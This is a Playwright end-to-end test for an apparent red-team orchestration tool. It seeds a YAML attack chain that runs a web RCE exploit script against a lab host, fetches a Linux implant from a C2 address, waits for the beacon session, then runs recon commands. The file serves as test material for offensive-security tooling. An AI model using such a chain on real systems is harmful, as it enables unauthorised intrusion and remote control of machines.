import { test, expect } from '@playwright/test';

// Full GUI-driven E2E against a LIVE stack (make up-web):
// operator opens Scenarios, starts the web initial-access chain from the browser,
// and the execution reaches "Done". Requires the chain to already exist in the DB
// (seed it once via: make run CHAIN=examples/initial-access-web.yaml, or POST it).
test('start web initial-access scenario from the GUI and see it complete', async ({ page }) => {
  test.setTimeout(150_000); // implant build + beacon check-in can take a while
  // Ensure the chain exists (idempotent seed via the same API the UI uses).
  const yaml = `id: gui-e2e-initial-access
name: "GUI E2E — web initial access"
targets:
  - name: web1
    host: 172.20.0.30
    port: 8080
    attrs: { path: /ping }
steps:
  - id: breach
    action:
      type: initial_access
      initial_access:
        target: web1
        module: external
        config:
          run: '["python3", "/opt/exploits/web_rce.py"]'
          implant_url: "http://172.20.0.10:8080/api/v1/implant/linux?c2=172.20.0.10"
        wait: { timeout: "240s", match_hostname: "victim-web" }
    output_var: web1_session
    timeout: "300s"
    on_fail: abort
  - id: recon
    depends_on: [breach]
    session_id: "{{web1_session}}"
    action: { type: command, command: { interpreter: sh, cmd: "id && hostname" } }
    timeout: "30s"
`;
  await page.request.post('/api/v1/chains', {
    headers: { 'Content-Type': 'application/yaml' },
    data: yaml,
  });

  // 1. Scenarios list → the seeded chain is the first row.
  await page.goto('/scenarios');
  await expect(page.getByText('GUI E2E — web initial access').first()).toBeVisible({ timeout: 15_000 });

  // 2. Click its Execute button (aria-label; i18n: Execute / Выполнить).
  await page.getByRole('button', { name: /Execute|Выполн/i }).first().click();

  // 3. Session-selector modal → this chain captures its own session.
  await page.getByRole('button', { name: /Run without session/i }).click();

  // 4. We navigate to the live execution viewer.
  await expect(page).toHaveURL(/\/execution\//, { timeout: 15_000 });

  // 5. The overall execution status badge reaches "Done" (SSE-driven).
  await expect(
    page.getByRole('status').filter({ hasText: /Done|Заверш/i }).first(),
  ).toBeVisible({ timeout: 120_000 });
});
